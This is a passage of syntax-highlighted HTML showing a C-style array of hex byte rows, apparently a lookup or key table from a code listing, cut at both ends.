class="number">0xa0</span>, <span class="number">0x27</span>, <span class="number">0x7b</span>, <span class="number">0x61</span>, <span class="number">0xfb</span>, <span class="number">0x01</span>, <span class="number">0x64</span>, <span class="number">0x0b</span>, <span class="number">0xf4</span>, <span class="number">0x81</span>, <span class="number">0x43</span>, <span class="number">0xe3</span>, <span class="number">0x5b</span>, <span class="number">0x1c</span>, <span class="number">0x97</span>, <span class="number">0x65</span>, <span class="number">0xd7</span>, <span class="number">0x3c</span>, <span class="number">0xda</span>, <span class="number">0x0d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x59</span>, <span class="number">0x73</span>, <span class="number">0xa1</span>, <span class="number">0x26</span>, <span class="number">0x7a</span>, <span class="number">0x60</span>, <span class="number">0xfa</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x0a</span>, <span class="number">0xf5</span>, <span class="number">0x80</span>, <span class="number">0x42</span>, <span class="number">0xe2</span>, <span class="number">0x5a</span>, <span class="number">0x1d</span>, <span class="number">0x96</span>, <span class="number">0x64</span>, <span class="number">0xd6</span>, <span class="number">0x3d</span>, <span class="number">0xdb</span>, <span class="number">0x0c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5a</span>, <span class="number">0x70</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x79</span>, <span class="number">0x63</span>, <span class="number">0xf9</span>, <span class="number">0x03</span>, <span class="number">0x66</span>, <span class="number">0x09</span>, <span class="number">0xf6</span>, <span class="number">0x83</span>, <span class="number">0x41</span>, <span class="number">0xe1</span>, <span class="number">0x59</span>, <span class="number">0x1e</span>, <span class="number">0x95</span>, <span class="number">0x67</span>, <span class="number">0xd5</span>, <span class="number">0x3e</span>, <span class="number">0xd8</span>, <span class="number">0x0f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x5b</span>, <span class="number">0x71</span>, <span class="number">0xa3</span>, <span class="number">0x24</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0xf8</span>, <span class="number">0x02</span>, <span class="number">0x67</span>, <span class="number">0x08</span>, <span class="number">0xf7</span>, <span class="number">0x82</span>, <span class="number">0x40</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x1f</span>, <span class="number">0x94</span>, <span class="number">0x66</span>, <span class="number">0xd4</span>, <span class="number">0x3f</span>, <span class="number">0xd9</span>, <span class="number">0x0e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x64</span>, <span class="number">0x4e</span>, <span class="number">0x9c</span>, <span class="number">0x1b</span>, <span class="number">0x47</span>, <span class="number">0x5d</span>, <span class="number">0xc7</span>, <span class="number">0x3d</span>, <span class="number">0x58</span>, <span class="number">0x37</span>, <span class="number">0xc8</span>, <span class="number">0xbd</span>, <span class="number">0x7f</span>, <span class="number">0xdf</span>, <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0xab</span>, <span class="number">0x59</span>, <span class="number">0xeb</span>, <span class="number">0x00</span>, <span class="number">0xe6</span>, <span class="number">0x31</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x65</span>, <span class="number">0x4f</span>, <span class="number">0x9d</span>, <span class="number">0x1a</span>, <span class="number">0x46</span>, <span class="number">0x5c</span>, <span class="number">0xc6</span>, <span class="number">0x3c</span>, <span class="number">0x59</span>, <span class="number">0x36</span>, <span class="number">0xc9</span>, <span class="number">0xbc</span>, <span class="number">0x7e</span>, <span class="number">0xde</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0xea</span>, <span class="number">0x01</span>, <span class="number">0xe7</span>, <span class="number">0x30</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x66</span>, <span class="number">0x4c</span>, <span class="number">0x9e</span>, <span class="number">0x19</span>, <span class="number">0x45</span>, <span class="number">0x5f</span>, <span class="number">0xc5</span>, <span class="number">0x3f</span>, <span class="number">0x5a</span>, <span class="number">0x35</span>, <span class="number">0xca</span>, <span class="number">0xbf</span>, <span class="number">0x7d</span>, <span class="number">0xdd</span>, <span class="number">0x65</span>, <span class="number">0x22</span>, <span class="number">0xa9</span>, <span class="number">0x5b</span>, <span class="number">0xe9</span>, <span class="number">0x02</span>, <span class="number">0xe4</span>, <span class="number">0x33</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x67</span>, <span class="number">0x4d</span>, <span class="number">0x9f</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x5e</span>, <span class="number">0xc4</span>, <span class="number">0x3e</span>, <span class="number">0x5b</span>, <span class="number">0x34</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x7c</span>, <span class="number">0xdc</span>, <span class="number">0x64</span>, <span class="number">0x23</span>, <span class="number">0xa8</span>, <span class="number">0x5a</span>, <span class="number">0xe8</span>, <span class="number">0x03</span>, <span class="number">0xe5</span>, <span class="number">0x32</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x60</span>, <span class="number">0x4a</span>, <span class="number">0x98</span>, <span class="number">0x1f</span>, <span class="number">0x43</span>, <span class="number">0x59</span>, <span class="number">0xc3</span>, <span class="number">0x39</span>, <span class="number">0x5c</span>, <span class="number">0x33</span>, <span class="number">0xcc</span>, <span class="number">0xb9</span>, <span class="number">0x7b</span>, <span class="number">0xdb</span>, <span class="number">0x63</span>, <span class="number">0x24</span>, <span class="number">0xaf</span>, <span class="number">0x5d</span>, <span class="number">0xef</span>, <span class="number">0x04</span>, <span class="number">0xe2</span>, <span class="number">0x35</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x61</span>, <span class="number">0x4b</span>, <span class="number">0x99</span>, <span class="number">0x1e</span>, <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0xc2</span>, <span class="number">0x38</span>, <span class="number">0x5d</span>, <span class="number">0x32</span>, <span class="number">0xcd</span>, <span class="number">0xb8</span>, <span class="number">0x7a</span>, <span class="number">0xda</span>, <span class="number">0x62</span>, <span class="number">0x25</span>, <span class="number">0xae</span>, <span class="number">0x5c</span>, <span class="number">0xee</span>, <span class="number">0x05</span>, <span class="number">0xe3</span>, <span class="number">0x34</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x62</span>, <span class="number">0x48</span>, <span class="number">0x9a</span>, <span class="number">0x1d</span>, <span class="number">0x41</span>, <span class="number">0x5b</span>, <span class="number">0xc1</span>, <span class="number">0x3b</span>, <span class="number">0x5e</span>, <span class="number">0x31</span>, <span class="number">0xce</span>, <span class="number">0xbb</span>, <span class="number">0x79</span>, <span class="number">0xd9</span>, <span class="number">0x61</span>, <span class="number">0x26</span>, <span class="number">0xad</span>, <span class="number">0x5f</span>, <span class="number">0xed</span>, <span class="number">0x06</span>, <span class="number">0xe0</span>, <span class="number">0x37</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x63</span>, <span class="number">0x49</span>, <span class="number">0x9b</span>, <span class="number">0x1c</span>, <span class="number">0x40</span>, <span class="number">0x5a</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x5f</span>, <span class="number">0x30</span>, <span class="number">0xcf</span>, <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0xd8</span>, <span class="number">0x60</span>, <span class="number">0x27</span>, <span class="number">0xac</span>, <span class="number">0x5e</span>, <span class="number">0xec</span>, <span class="number">0x07</span>, <span class="number">0xe1</span>, <span class="number">0x36</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6c</span>, <span class="number">0x46</span>, <span class="number">0x94</span>, <span class="number">0x13</span>, <span class="number">0x4f</span>, <span class="number">0x55</span>, <span class="number">0xcf</span>, <span class="number">0x35</span>, <span class="number">0x50</span>, <span class="number">0x3f</span>, <span class="number">0xc0</span>, <span class="number">0xb5</span>, <span class="number">0x77</span>, <span class="number">0xd7</span>, <span class="number">0x6f</span>, <span class="number">0x28</span>, <span class="number">0xa3</span>, <span class="number">0x51</span>, <span class="number">0xe3</span>, <span class="number">0x08</span>, <span class="number">0xee</span>, <span class="number">0x39</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6d</span>, <span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x12</span>, <span class="number">0x4e</span>, <span class="number">0x54</span>, <span class="number">0xce</span>, <span class="number">0x34</span>, <span class="number">0x51</span>, <span class="number">0x3e</span>, <span class="number">0xc1</span>, <span class="number">0xb4</span>, <span class="number">0x76</span>, <span class="number">0xd6</span>, <span class="number">0x6e</span>, <span class="number">0x29</span>, <span class="number">0xa2</span>, <span class="number">0x50</span>, <span class="number">0xe2</span>, <span class="number">0x09</span>, <span class="number">0xef</span>, <span class="number">0x38</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6e</span>, <span class="number">0x44</span>, <span class="number">0x96</span>, <span class="number">0x11</span>, <span class="number">0x4d</span>, <span class="number">0x57</span>, <span class="number">0xcd</span>, <span class="number">0x37</span>, <span class="number">0x52</span>, <span class="number">0x3d</span>, <span class="number">0xc2</span>, <span class="number">0xb7</span>, <span class="number">0x75</span>, <span class="number">0xd5</span>, <span class="number">0x6d</span>, <span class="number">0x2a</span>, <span class="number">0xa1</span>, <span class="number">0x53</span>, <span class="number">0xe1</span>, <span class="number">0x0a</span>, <span class="number">0xec</span>, <span class="number">0x3b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6f</span>, <span class="number">0x45</span>, <span class="number">0x97</span>, <span class="number">0x10</span>, <span class="number">0x4c</span>, <span class="number">0x56</span>, <span class="number">0xcc</span>, <span class="number">0x36</span>, <span class="number">0x53</span>, <span class="number">0x3c</span>, <span class="number">0xc3</span>, <span class="number">0xb6</span>, <span class="number">0x74</span>, <span class="number">0xd4</span>, <span class="number">0x6c</span>, <span class="number">0x2b</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0xe0</span>, <span class="number">0x0b</span>, <span class="number">0xed</span>, <span class="number">0x3a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x68</span>, <span class="number">0x42</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0x4b</span>, <span class="number">0x51</span>, <span class="number">0xcb</span>, <span class="number">0x31</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0xc4</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xd3</span>, <span class="number">0x6b</span>, <span class="number">0x2c</span>, <span class="number">0xa7</span>, <span class="number">0x55</span>, <span class="number">0xe7</span>, <span class="number">0x0c</span>, <span class="number">0xea</span>, <span class="number">0x3d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x69</span>, <span class="number">0x43</span>, <span class="number">0x91</span>, <span class="number">0x16</span>, <span class="number">0x4a</span>, <span class="number">0x50</span>, <span class="number">0xca</span>, <span class="number">0x30</span>, <span class="number">0x55</span>, <span class="number">0x3a</span>, <span class="number">0xc5</span>, <span class="number">0xb0</span>, <span class="number">0x72</span>, <span class="number">0xd2</span>, <span class="number">0x6a</span>, <span class="number">0x2d</span>, <span class="number">0xa6</span>, <span class="number">0x54</span>, <span class="number">0xe6</span>, <span class="number">0x0d</span>, <span class="number">0xeb</span>, <span class="number">0x3c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x92</span>, <span class="number">0x15</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0xc9</span>, <span class="number">0x33</span>, <span class="number">0x56</span>, <span class="number">0x39</span>, <span class="number">0xc6</span>, <span class="number">0xb3</span>, <span class="number">0x71</span>, <span class="number">0xd1</span>, <span class="number">0x69</span>, <span class="number">0x2e</span>, <span class="number">0xa5</span>, <span class="number">0x57</span>, <span class="number">0xe5</span>, <span class="number">0x0e</span>, <span class="number">0xe8</span>, <span class="number">0x3f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6b</span>, <span class="number">0x41</span>, <span class="number">0x93</span>, <span class="number">0x14</span>, <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0xc8</span>, <span class="number">0x32</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0xc7</span>, <span class="number">0xb2</span>, <span class="number">0x70</span>, <span class="number">0xd0</span>, <span class="number">0x68</span>, <span class="number">0x2f</span>, <span class="number">0xa4</span>, <span class="number">0x56</span>, <span class="number">0xe4</span>, <span class="number">0x0f</span>, <span class="number">0xe9</span>, <span class="number">0x3e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x74</span>, <span class="number">0x5e</span>, <span class="number">0x8c</span>, <span class="number">0x0b</span>, <span class="number">0x57</span>, <span class="number">0x4d</span>, <span class="number">0xd7</span>, <span class="number">0x2d</span>, <span class="number">0x48</span>, <span class="number">0x27</span>, <span class="number">0xd8</span>, <span class="number">0xad</span>, <span class="number">0x6f</span>, <span class="number">0xcf</span>, <span class="number">0x77</span>, <span class="number">0x30</span>, <span class="number">0xbb</span>, <span class="number">0x49</span>, <span class="number">0xfb</span>, <span class="number">0x10</span>, <span class="number">0xf6</span>, <span class="number">0x21</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x75</span>, <span class="number">0x5f</span>, <span class="number">0x8d</span>, <span class="number">0x0a</span>, <span class="number">0x56</span>, <span class="number">0x4c</span>, <span class="number">0xd6</span>, <span class="number">0x2c</span>, <span class="number">0x49</span>, <span class="number">0x26</span>, <span class="number">0xd9</span>, <span class="number">0xac</span>, <span class="number">0x6e</span>, <span class="number">0xce</span>, <span class="number">0x76</span>, <span class="number">0x31</span>, <span class="number">0xba</span>, <span class="number">0x48</span>, <span class="number">0xfa</span>, <span class="number">0x11</span>, <span class="number">0xf7</span>, <span class="number">0x20</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x76</span>, <span class="number">0x5c</span>, <span class="number">0x8e</span>, <span class="number">0x09</span>, <span class="number">0x55</span>, <span class="number">0x4f</span>, <span class="number">0xd5</span>, <span class="number">0x2f</span>, <span class="number">0x4a</span>, <span class="number">0x25</span>, <span class="number">0xda</span>, <span class="number">0xaf</span>, <span class="number">0x6d</span>, <span class="number">0xcd</span>, <span class="number">0x75</span>, <span class="number">0x32</span>, <span class="number">0xb9</span>, <span class="number">0x4b</span>, <span class="number">0xf9</span>, <span class="number">0x12</span>, <span class="number">0xf4</span>, <span class="number">0x23</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x77</span>, <span class="number">0x5d</span>, <span class="number">0x8f</span>, <span class="number">0x08</span>, <span class="number">0x54</span>, <span class="number">0x4e</span>, <span class="number">0xd4</span>, <span class="number">0x2e</span>, <span class="number">0x4b</span>, <span class="number">0x24</span>, <span class="number">0xdb</span>, <span class="number">0xae</span>, <span class="number">0x6c</span>, <span class="number">0xcc</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xb8</span>, <span class="number">0x4a</span>, <span class="number">0xf8</span>, <span class="number">0x13</span>, <span class="number">0xf5</span>, <span class="number">0x22</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x70</span>, <span class="number">0x5a</span>, <span class="number">0x88</span>, <span class="number">0x0f</span>, <span class="number">0x53</span>, <span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x29</span>, <span class="number">0x4c</span>, <span class="number">0x23</span>, <span class="number">0xdc</span>, <span class="number">0xa9</span>, <span class="number">0x6b</span>, <span class="number">0xcb</span>, <span class="number">0x73</span>, <span class="number">0x34</span>, <span class="number">0xbf</span>, <span class="number">0x4d</span>, <span class="number">0xff</span>, <span class="number">0x14</span>, <span class="number">0xf2</span>, <span class="number">0x25</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x71</span>, <span class="number">0x5b</span>, <span class="number">0x89</span>, <span class="number">0x0e</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0xd2</span>, <span class="number">0x28</span>, <span class="number">0x4d</span>, <span class="number">0x22</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x6a</span>, <span class="number">0xca</span>, <span class="number">0x72</span>, <span class="number">0x35</span>, <span class="number">0xbe</span>, <span class="number">0x4c</span>, <span class="number">0xfe</span>, <span class="number">0x15</span>, <span class="number">0xf3</span>, <span class="number">0x24</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x72</span>, <span class="number">0x58</span>, <span class="number">0x8a</span>, <span class="number">0x0d</span>, <span class="number">0x51</span>, <span class="number">0x4b</span>, <span class="number">0xd1</span>, <span class="number">0x2b</span>, <span class="number">0x4e</span>, <span class="number">0x21</span>, <span class="number">0xde</span>, <span class="number">0xab</span>, <span class="number">0x69</span>, <span class="number">0xc9</span>, <span class="number">0x71</span>, <span class="number">0x36</span>, <span class="number">0xbd</span>, <span class="number">0x4f</span>, <span class="number">0xfd</span>, <span class="number">0x16</span>, <span class="number">0xf0</span>, <span class="number">0x27</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x73</span>, <span class="number">0x59</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x50</span>, <span class="number">0x4a</span>, <span class="number">0xd0</span>, <span class="number">0x2a</span>, <span class="number">0x4f</span>, <span class="number">0x20</span>, <span class="number">0xdf</span>, <span class="number">0xaa</span>, <span class="number">0x68</span>, <span class="number">0xc8</span>, <span class="number">0x70</span>, <span class="number">0x37</span>, <span class="number">0xbc</span>, <span class="number">0x4e</span>, <span class="number">0xfc</span>, <span class="number">0x17</span>, <span class="number">0xf1</span>, <span class="number">0x26</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7c</span>, <span class="number">0x56</span>, <span class="number">0x84</span>, <span class="number">0x03</span>, <span class="number">0x5f</span>, <span class="number">0x45</span>, <span class="number">0xdf</span>, <span class="number">0x25</span>, <span class="number">0x40</span>, <span class="number">0x2f</span>, <span class="number">0xd0</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0xc7</span>, <span class="number">0x7f</span>, <span class="number">0x38</span>, <span class="number">0xb3</span>, <span class="number">0x41</span>, <span class="number">0xf3</span>, <span class="number">0x18</span>, <span class="number">0xfe</span>, <span class="number">0x29</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7d</span>, <span class="number">0x57</span>, <span class="number">0x85</span>, <span class="number">0x02</span>, <span class="number">0x5e</span>, <span class="number">0x44</span>, <span class="number">0xde</span>, <span class="number">0x24</span>, <span class="number">0x41</span>, <span class="number">0x2e</span>, <span class="number">0xd1</span>, <span class="number">0xa4</span>, <span class="number">0x66</span>, <span class="number">0xc6</span>, <span class="number">0x7e</span>, <span class="number">0x39</span>, <span class="number">0xb2</span>, <span class="number">0x40</span>, <span class="number">0xf2</span>, <span class="number">0x19</span>, <span class="number">0xff</span>, <span class="number">0x28</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7e</span>, <span class="number">0x54</span>, <span class="number">0x86</span>, <span class="number">0x01</span>, <span class="number">0x5d</span>, <span class="number">0x47</span>, <span class="number">0xdd</span>, <span class="number">0x27</span>, <span class="number">0x42</span>, <span class="number">0x2d</span>, <span class="number">0xd2</span>, <span class="number">0xa7</span>, <span class="number">0x65</span>, <span class="number">0xc5</span>, <span class="number">0x7d</span>, <span class="number">0x3a</span>, <span class="number">0xb1</span>, <span class="number">0x43</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0xfc</span>, <span class="number">0x2b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7f</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x00</span>, <span class="number">0x5c</span>, <span class="number">0x46</span>, <span class="number">0xdc</span>, <span class="number">0x26</span>, <span class="number">0x43</span>, <span class="number">0x2c</span>, <span class="number">0xd3</span>, <span class="number">0xa6</span>, <span class="number">0x64</span>, <span class="number">0xc4</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0xb0</span>, <span class="number">0x42</span>, <span class="number">0xf0</span>, <span class="number">0x1b</span>, <span class="number">0xfd</span>, <span class="number">0x2a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x78</span>, <span class="number">0x52</span>, <span class="number">0x80</span>, <span class="number">0x07</span>, <span class="number">0x5b</span>, <span class="number">0x41</span>, <span class="number">0xdb</span>, <span class="number">0x21</span>, <span class="number">0x44</span>, <span class="number">0x2b</span>, <span class="number">0xd4</span>, <span class="number">0xa1</span>, <span class="number">0x63</span>, <span class="number">0xc3</span>, <span class="number">0x7b</span>, <span class="number">0x3c</span>, <span class="number">0xb7</span>, <span class="number">0x45</span>, <span class="number">0xf7</span>, <span class="number">0x1c</span>, <span class="number">0xfa</span>, <span class="number">0x2d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x79</span>, <span class="number">0x53</span>, <span class="number">0x81</span>, <span class="number">0x06</span>, <span class="number">0x5a</span>, <span class="number">0x40</span>, <span class="number">0xda</span>, <span class="number">0x20</span>, <span class="number">0x45</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa0</span>, <span class="number">0x62</span>, <span class="number">0xc2</span>, <span class="number">0x7a</span>, <span class="number">0x3d</span>, <span class="number">0xb6</span>, <span class="number">0x44</span>, <span class="number">0xf6</span>, <span class="number">0x1d</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7a</span>, <span class="number">0x50</span>, <span class="number">0x82</span>, <span class="number">0x05</span>, <span class="number">0x59</span>, <span class="number">0x43</span>, <span class="number">0xd9</span>, <span class="number">0x23</span>, <span class="number">0x46</span>, <span class="number">0x29</span>, <span class="number">0xd6</span>, <span class="number">0xa3</span>, <span class="number">0x61</span>, <span class="number">0xc1</span>, <span class="number">0x79</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x47</span>, <span class="number">0xf5</span>, <span class="number">0x1e</span>, <span class="number">0xf8</span>, <span class="number">0x2f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x7b</span>, <span class="number">0x51</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x58</span>, <span class="number">0x42</span>, <span class="number">0xd8</span>, <span class="number">0x22</span>, <span class="number">0x47</span>, <span class="number">0x28</span>, <span class="number">0xd7</span>, <span class="number">0xa2</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x78</span>, <span class="number">0x3f</span>, <span class="number">0xb4</span>, <span class="number">0x46</span>, <span class="number">0xf4</span>, <span class="number">0x1f</span>, <span class="number">0xf9</span>, <span class="number">0x2e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x04</span>, <span class="number">0x2e</span>, <span class="number">0xfc</span>, <span class="number">0x7b</span>, <span class="number">0x27</span>, <span class="number">0x3d</span>, <span class="number">0xa7</span>, <span class="number">0x5d</span>, <span class="number">0x38</span>, <span class="number">0x57</span>, <span class="number">0xa8</span>, <span class="number">0xdd</span>, <span class="number">0x1f</span>, <span class="number">0xbf</span>, <span class="number">0x07</span>, <span class="number">0x40</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x8b</span>, <span class="number">0x60</span>, <span class="number">0x86</span>, <span class="number">0x51</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x05</span>, <span class="number">0x2f</span>, <span class="number">0xfd</span>, <span class="number">0x7a</span>, <span class="number">0x26</span>, <span class="number">0x3c</span>, <span class="number">0xa6</span>, <span class="number">0x5c</span>, <span class="number">0x39</span>, <span class="number">0x56</span>, <span class="number">0xa9</span>, <span class="number">0xdc</span>, <span class="number">0x1e</span>, <span class="number">0xbe</span>, <span class="number">0x06</span>, <span class="number">0x41</span>, <span class="number">0xca</span>, <span class="number">0x38</span>, <span class="number">0x8a</span>, <span class="number">0x61</span>, <span class="number">0x87</span>, <span class="number">0x50</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x06</span>, <span class="number">0x2c</span>, <span class="number">0xfe</span>, <span class="number">0x79</span>, <span class="number">0x25</span>, <span class="number">0x3f</span>, <span class="number">0xa5</span>, <span class="number">0x5f</span>, <span class="number">0x3a</span>, <span class="number">0x55</span>, <span class="number">0xaa</span>, <span class="number">0xdf</span>, <span class="number">0x1d</span>, <span class="number">0xbd</span>, <span class="number">0x05</span>, <span class="number">0x42</span>, <span class="number">0xc9</span>, <span class="number">0x3b</span>, <span class="number">0x89</span>, <span class="number">0x62</span>, <span class="number">0x84</span>, <span class="number">0x53</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x07</span>, <span class="number">0x2d</span>, <span class="number">0xff</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x3e</span>, <span class="number">0xa4</span>, <span class="number">0x5e</span>, <span class="number">0x3b</span>, <span class="number">0x54</span>, <span class="number">0xab</span>, <span class="number">0xde</span>, <span class="number">0x1c</span>, <span class="number">0xbc</span>, <span class="number">0x04</span>, <span class="number">0x43</span>, <span class="number">0xc8</span>, <span class="number">0x3a</span>, <span class="number">0x88</span>, <span class="number">0x63</span>, <span class="number">0x85</span>, <span class="number">0x52</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x00</span>, <span class="number">0x2a</span>, <span class="number">0xf8</span>, <span class="number">0x7f</span>, <span class="number">0x23</span>, <span class="number">0x39</span>, <span class="number">0xa3</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x53</span>, <span class="number">0xac</span>, <span class="number">0xd9</span>, <span class="number">0x1b</span>, <span class="number">0xbb</span>, <span class="number">0x03</span>, <span class="number">0x44</span>, <span class="number">0xcf</span>, <span class="number">0x3d</span>, <span class="number">0x8f</span>, <span class="number">0x64</span>, <span class="number">0x82</span>, <span class="number">0x55</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x01</span>, <span class="number">0x2b</span>, <span class="number">0xf9</span>, <span class="number">0x7e</span>, <span class="number">0x22</span>, <span class="number">0x38</span>, <span class="number">0xa2</span>, <span class="number">0x58</span>, <span class="number">0x3d</span>, <span class="number">0x52</span>, <span class="number">0xad</span>, <span class="number">0xd8</span>, <span class="number">0x1a</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0x45</span>, <span class="number">0xce</span>, <span class="number">0x3c</span>, <span class="number">0x8e</span>, <span class="number">0x65</span>, <span class="number">0x83</span>, <span class="number">0x54</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0xfa</span>, <span class="number">0x7d</span>, <span class="number">0x21</span>, <span class="number">0x3b</span>, <span class="number">0xa1</span>, <span class="number">0x5b</span>, <span class="number">0x3e</span>, <span class="number">0x51</span>, <span class="number">0xae</span>, <span class="number">0xdb</span>, <span class="number">0x19</span>, <span class="number">0xb9</span>, <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0xcd</span>, <span class="number">0x3f</span>, <span class="number">0x8d</span>, <span class="number">0x66</span>, <span class="number">0x80</span>, <span class="number">0x57</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0xfb</span>, <span class="number">0x7c</span>, <span class="number">0x20</span>, <span class="number">0x3a</span>, <span class="number">0xa0</span>, <span class="number">0x5a</span>, <span class="number">0x3f</span>, <span class="number">0x50</span>, <span class="number">0xaf</span>, <span class="number">0xda</span>, <span class="number">0x18</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0xcc</span>, <span class="number">0x3e</span>, <span class="number">0x8c</span>, <span class="number">0x67</span>, <span class="number">0x81</span>, <span class="number">0x56</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0c</span>, <span class="number">0x26</span>, <span class="number">0xf4</span>, <span class="number">0x73</span>, <span class="number">0x2f</span>, <span class="number">0x35</span>, <span class="number">0xaf</span>, <span class="number">0x55</span>, <span class="number">0x30</span>, <span class="number">0x5f</span>, <span class="number">0xa0</span>, <span class="number">0xd5</span>, <span class="number">0x17</span>, <span class="number">0xb7</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0xc3</span>, <span class="number">0x31</span>, <span class="number">0x83</span>, <span class="number">0x68</span>, <span class="number">0x8e</span>, <span class="number">0x59</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0d</span>, <span class="number">0x27</span>, <span class="number">0xf5</span>, <span class="number">0x72</span>, <span class="number">0x2e</span>, <span class="number">0x34</span>, <span class="number">0xae</span>, <span class="number">0x54</span>, <span class="number">0x31</span>, <span class="number">0x5e</span>, <span class="number">0xa1</span>, <span class="number">0xd4</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x0e</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x30</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0x8f</span>, <span class="number">0x58</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0e</span>, <span class="number">0x24</span>, <span class="number">0xf6</span>, <span class="number">0x71</span>, <span class="number">0x2d</span>, <span class="number">0x37</span>, <span class="number">0xad</span>, <span class="number">0x57</span>, <span class="number">0x32</span>, <span class="number">0x5d</span>, <span class="number">0xa2</span>, <span class="number">0xd7</span>, <span class="number">0x15</span>, <span class="number">0xb5</span>, <span class="number">0x0d</span>, <span class="number">0x4a</span>, <span class="number">0xc1</span>, <span class="number">0x33</span>, <span class="number">0x81</span>, <span class="number">0x6a</span>, <span class="number">0x8c</span>, <span class="number">0x5b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0f</span>, <span class="number">0x25</span>, <span class="number">0xf7</span>, <span class="number">0x70</span>, <span class="number">0x2c</span>, <span class="number">0x36</span>, <span class="number">0xac</span>, <span class="number">0x56</span>, <span class="number">0x33</span>, <span class="number">0x5c</span>, <span class="number">0xa3</span>, <span class="number">0xd6</span>, <span class="number">0x14</span>, <span class="number">0xb4</span>, <span class="number">0x0c</span>, <span 